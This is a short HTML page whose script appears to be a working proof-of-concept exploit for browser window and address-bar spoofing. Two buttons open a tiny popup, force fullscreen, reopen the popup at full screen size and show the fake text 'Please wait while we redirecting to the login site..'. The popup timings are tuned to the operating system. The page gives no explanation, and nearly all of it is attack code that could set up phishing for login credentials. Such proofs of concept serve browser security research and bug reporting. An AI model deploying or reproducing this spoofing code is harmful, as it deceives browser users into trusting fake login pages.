<style>

</style>
<script>
  var spoofWindow;
  var spoofDelay;

  if(!statusbar.visible) {
      window.document.styleSheets[0].insertRule("button { display: none }")
  }

  if (navigator.platform.includes("Win")) {
    spoofDelay = 255;
  } else {
    spoofDelay = 30;
  }

  async function launchPopup() {
      spoofWindow = window.open(
      location.href,
      "popup",
      "height=1,width=1"
    )
    await new Promise(r => setTimeout(r, 65));
    spoofWindow.document.styleSheets[0].insertRule("button { display: none }")
  }

  async function reusePopupSpoof() {
      document.documentElement.requestFullscreen()

      await new Promise(r => setTimeout(r, spoofDelay));

      spoofWindow = window.open(
      location.href,
      "popup",
      ""
    )

    spoofWindow.document.write("Please wait while we redirecting to the login site..")
    spoofWindow.moveTo(0, 0)
    spoofWindow.resizeTo(screen.availHeight*2, screen.availWidth*2)

    await new Promise(r => setTimeout(r, spoofDelay+3333));
    spoofWindow.close();

  }
</script>
<button onclick="launchPopup()">Launch Popup</button>
<button onclick="reusePopupSpoof()">Reuse Popup Spoof</button>
